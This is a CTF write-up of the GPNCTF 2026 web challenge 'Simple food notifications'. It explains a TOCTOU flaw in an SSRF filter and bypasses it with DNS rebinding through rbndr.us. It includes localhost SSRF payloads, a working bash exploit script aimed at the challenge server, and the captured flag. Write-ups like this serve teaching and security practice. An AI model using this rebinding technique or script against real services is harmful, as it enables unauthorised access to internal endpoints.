---
title: "GPNCTF2026-Simple food notifications"
description: "CTF writeup - Simple food notifications (GPNCTF 2026)"
date: 2026-05-30
tags: [CTF, Web, GPNCTF]
category: "GPNCTF 2026"
cover: ./cover.png
pinned: false
draft: false
---

### Check file source

The source contains a `/vip-meal` endpoint:

```python
FLAG = open("/flag").read().strip()

@app.route('/vip-meal')
def vip_meal():
    if request.remote_addr != "127.0.0.1":
        app.logger.warning(f"Your IP {request.remote_addr} is not whitelisted so see vip meals")
        return render_template('meal.html', message="You are not dressed appropriate to see even vip meals."), 401

    return render_template('meal.html', title="VIP Meal", message=f"Our chef cooked the beast meal for our vip customers, here is the flag {FLAG} with some caviar on top."), 200
```

This endpoint only returns the flag if the request comes from:

```text
127.0.0.1
```

If accessed directly from the outside it is denied. So the goal is to use SSRF to make the server request:

```text
http://127.0.0.1/vip-meal
```

### The SSRF filter

The application has an anti-SSRF filter. Before fetching a URL, the server extracts the hostname, resolves it with `socket.getaddrinfo()`, then checks the IP:

```python
addresses = socket.getaddrinfo(urllib3.util.parse_url(url).host, 80)

for addr in addresses:
    if not ipaddress.ip_address(addr[4][0]).is_global:
        notifications[id] = {
            "status": "REJECTED",
            "message": "Only staff is allowed to see mess in the kitchen..."
        }
        return
```

Therefore simple payloads are all blocked:

```text
http://127.0.0.1/vip-meal
http://localhost/vip-meal
http://2130706433/vip-meal
http://0x7f000001/vip-meal
```

The reason is these addresses all resolve to a non-global IP.

### Bypass idea

The weakness lies in the TOCTOU between the check step and the actual request step.

The server resolves the hostname once for the check:

```text
socket.getaddrinfo(host)
```

Then `urllib3` resolves the hostname again when performing the request:

```python
urllib3.request('GET', url, redirect=False, timeout=urllib3.Timeout(30))
```

That is, the hostname is resolved at least twice:

```text
Resolution #1: used for the is_global check
Resolution #2: used for the actual connection
```

If we use DNS rebinding so the first resolution returns a global IP, the filter passes. Then the actual request or retry returns `127.0.0.1`, and the server connects to localhost and gets the flag.

### DNS rebinding with rbndr.us

Use the domain:

```text
7f000001.08080808.rbndr.us
```

Where:

```text
7f000001 = 127.0.0.1
08080808 = 8.8.8.8
```

This domain randomly returns one of the two IPs:

```text
127.0.0.1
8.8.8.8
```

SSRF payload:

```text
http://7f000001.08080808.rbndr.us/vip-meal
```

If the first check resolves to `127.0.0.1`, the request is rejected.

If the first check resolves to `8.8.8.8`, the filter passes because `8.8.8.8` is a global IP. Then the connection to `8.8.8.8:80` times out. When `urllib3` retries, it resolves the domain again. If this time the domain returns `127.0.0.1`, the request goes to:

```text
http://127.0.0.1/vip-meal
```

In that case `request.remote_addr == "127.0.0.1"` and the `/vip-meal` endpoint returns the flag.

---

### Exploit script

```bash
#!/bin/bash

B="https://steamed-pineapple-crusted-with-candied-noodles-etjs.gpn24.ctf.kitctf.de"
URL="http://7f000001.08080808.rbndr.us/vip-meal"

for round in $(seq 1 20); do
  echo "[*] Round $round"

  while :; do
    resp=$(curl -s -X POST "$B/order" \
      --data-urlencode "url=$URL" \
      -d "meal=Gulasch")

    echo "$resp"

    id=$(echo "$resp" | grep -oP '/notification/\K[a-z0-9]+')

    if [ -n "$id" ]; then
      break
    fi

    w=$(echo "$resp" | grep -oP 'at least \K[0-9]+')
    if [ -n "$w" ]; then
      echo "[*] Rate limited, sleeping $((w + 2)) seconds..."
      sleep $((w + 2))
    else
      echo "[!] Could not get id, retrying in 5s..."
      sleep 5
    fi
  done

  echo "[*] Notification id: $id"

  for i in $(seq 1 90); do
    r=$(curl -s "$B/notification/$id")
    echo "$r"

    flag=$(echo "$r" | grep -oiE 'GPNCTF\{[^}]+\}')
    if [ -n "$flag" ]; then
      echo "[+] FLAG: $flag"
      exit 0
    fi

    st=$(echo "$r" | grep -oP '"status":\s*"\K[^"]+')

    if [ "$st" = "REJECTED" ] || [ "$st" = "FAILED" ]; then
      echo "[!] $st, retrying new order..."
      break
    fi

    sleep 2
  done
done
```

Run the script:

```bash
chmod +x solve.sh
./solve.sh
```

### Result

Some early rounds may be rejected; the final result:

```html
{"id": "usid5g4vve", "message": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>VIP Meal</title>\n    <link rel=\"stylesheet\" href=\"/static/css/style.css\">\n</head>\n<body>\n    <header>\n        <h1>VIP Meal</h1>\n    </header>\n    <main>\n        <p>Our chef cooked the beast meal for our vip customers, here is the flag GPNCTF{whY_M4K3_It_cOmplEx_WH3n_YOU_C4N_m4KE_i7_SImpL3} with some caviar on top.</p>\n        <a href=\"/\">Back to Home</a>\n    </main>\n</body>\n</html>", "status": "DONE"}
```

### Flag

```text
GPNCTF{whY_M4K3_It_cOmplEx_WH3n_YOU_C4N_m4KE_i7_SImpL3}
```
